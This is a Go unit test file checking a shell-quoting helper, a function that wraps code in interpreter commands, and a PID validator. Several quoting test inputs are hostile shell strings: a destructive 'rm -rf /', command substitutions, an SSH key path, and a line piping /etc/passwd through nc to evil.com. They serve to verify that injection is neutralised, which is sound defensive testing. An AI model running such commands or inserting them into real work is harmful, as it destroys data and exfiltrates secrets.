package util

import "testing"

func TestShellQuote(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "empty string",
			in:   "",
			want: "''",
		},
		{
			name: "simple string",
			in:   "hello",
			want: "'hello'",
		},
		{
			name: "single quote escape",
			in:   "it's",
			want: "'it'\\''s'",
		},
		{
			name: "shell metachar semicolon",
			in:   "hello; rm -rf /",
			want: "'hello; rm -rf /'",
		},
		{
			name: "backtick injection",
			in:   "`echo pwned`",
			want: "'`echo pwned`'",
		},
		{
			name: "dollar sign expansion",
			in:   "$HOME/.ssh/id_rsa",
			want: "'$HOME/.ssh/id_rsa'",
		},
		{
			name: "double quote",
			in:   `say "hello"`,
			want: `'say "hello"'`,
		},
		{
			name: "newline",
			in:   "line1\nline2",
			want: "'line1\nline2'",
		},
		{
			name: "null byte",
			in:   "hello\x00world",
			want: "'hello\x00world'",
		},
		{
			name: "unicode",
			in:   "こんにちは",
			want: "'こんにちは'",
		},
		{
			name: "multiple single quotes",
			in:   "it's a 'test'",
			want: "'it'\\''s a '\\''test'\\'''",
		},
		{
			name: "pipe and ampersand",
			in:   "cat /etc/passwd | nc evil.com 1234 &",
			want: "'cat /etc/passwd | nc evil.com 1234 &'",
		},
		{
			name: "command substitution",
			in:   "$(whoami)",
			want: "'$(whoami)'",
		},
		{
			name: "backslash",
			in:   "path\\to\\file",
			want: "'path\\to\\file'",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ShellQuote(tt.in)
			if got != tt.want {
				t.Errorf("ShellQuote(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestWrapCodeInCommand(t *testing.T) {
	tests := []struct {
		name     string
		code     string
		language string
		want     string
	}{
		{
			name:     "python lowercase",
			code:     "print('hello')",
			language: "python",
			want:     `python3 -c "print('hello')"`,
		},
		{
			name:     "python3 mixed case",
			code:     "print('hello')",
			language: "Python3",
			want:     `python3 -c "print('hello')"`,
		},
		{
			name:     "empty language defaults to python",
			code:     "print('hello')",
			language: "",
			want:     `python3 -c "print('hello')"`,
		},
		{
			name:     "javascript",
			code:     `console.log("hi")`,
			language: "javascript",
			want:     "node -e \"console.log(\\\"hi\\\")\"",
		},
		{
			name:     "node",
			code:     `console.log("hi")`,
			language: "node",
			want:     "node -e \"console.log(\\\"hi\\\")\"",
		},
		{
			name:     "bash returns code unchanged",
			code:     "echo hello && ls -la",
			language: "bash",
			want:     "echo hello && ls -la",
		},
		{
			name:     "sh returns code unchanged",
			code:     "echo hello",
			language: "sh",
			want:     "echo hello",
		},
		{
			name:     "unknown language",
			code:     "puts 'hello'",
			language: "ruby",
			want:     "ruby -c \"puts 'hello'\"",
		},
		{
			name:     "code with special chars",
			code:     "x = 1 + 2; print(x)",
			language: "python",
			want:     `python3 -c "x = 1 + 2; print(x)"`,
		},
		{
			name:     "code with quotes and newlines",
			code:     "a = \"hello\"\nb = 'world'",
			language: "python",
			want:     "python3 -c \"a = \\\"hello\\\"\\nb = 'world'\"",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := WrapCodeInCommand(tt.code, tt.language)
			if got != tt.want {
				t.Errorf("WrapCodeInCommand(%q, %q) = %q, want %q", tt.code, tt.language, got, tt.want)
			}
		})
	}
}

func TestValidatePID(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantPID int
		wantErr bool
	}{
		{
			name:    "valid PID 123",
			input:   "123",
			wantPID: 123,
			wantErr: false,
		},
		{
			name:    "valid PID 0",
			input:   "0",
			wantPID: 0,
			wantErr: false,
		},
		{
			name:    "valid PID 1",
			input:   "1",
			wantPID: 1,
			wantErr: false,
		},
		{
			name:    "empty string",
			input:   "",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "non-numeric",
			input:   "abc",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "trailing letters rejected",
			input:   "123abc",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "decimal rejected",
			input:   "12.5",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "negative PID accepted by implementation",
			// NOTE: fmt.Sscanf("%d") accepts negative numbers.
			// The implementation does not reject them. PID -1 is returned as-is.
			input:   "-1",
			wantPID: -1,
			wantErr: false,
		},
		{
			name:    "overflow rejected",
			input:   "99999999999999999999",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "whitespace around number accepted",
			// fmt.Sscanf skips leading whitespace for %d, trailing space
			// is consumed as EOF (n=1, err=EOF), so it passes validation.
			input:   " 123 ",
			wantPID: 123,
			wantErr: false,
		},
		{
			name:    "pure whitespace rejected",
			input:   "   ",
			wantPID: 0,
			wantErr: true,
		},
		{
			name:    "large valid PID",
			input:   "4194304",
			wantPID: 4194304,
			wantErr: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pid, err := ValidatePID(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePID(%q) error = %v, wantErr = %v", tt.input, err, tt.wantErr)
				return
			}
			if pid != tt.wantPID {
				t.Errorf("ValidatePID(%q) = %d, want %d", tt.input, pid, tt.wantPID)
			}
		})
	}
}
